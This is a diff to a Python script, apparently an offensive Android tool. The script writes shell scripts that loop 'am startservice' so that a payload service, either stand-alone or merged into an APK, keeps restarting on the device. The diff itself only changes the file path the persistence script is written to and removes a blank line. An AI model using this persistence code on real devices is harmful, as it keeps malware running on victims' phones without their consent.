@@ -21,7 +21,7 @@ if(len(sys.argv) > 1):
 # this function run when user specified a non embedded payload
 def original():
     # write a script for non embedded payload
-    with open('./Scripts/PersistenceScript.sh', 'w') as f:
+    with open('./PersistenceScript.sh', 'w') as f:
         # android shell script to execute payload automatically 
         f.write('#!/bin/sh\n'
                 'while :\n'
@@ -42,7 +42,7 @@ def merged():
         result = re.search('android:name="(.*)"/>', line)
         string = result.group(1)
         res = string.rsplit('.', 2)
-        with open('./Scripts/PersistenceScript.sh', 'w') as f:
+        with open('./PersistenceScript.sh', 'w') as f:
             f.write('#!/bin/bash\n'
                     'while :\n'
                     'do am startservice --user 0 ' +
@@ -100,7 +100,6 @@ elif arg == "-a" or arg == "--apk":
             print("No APK found at " + path)
     else: 
         print("No path specified.")
-    
 elif arg == "-G" or arg == "--GUI":
 
     # this function run when user click the choose APK button
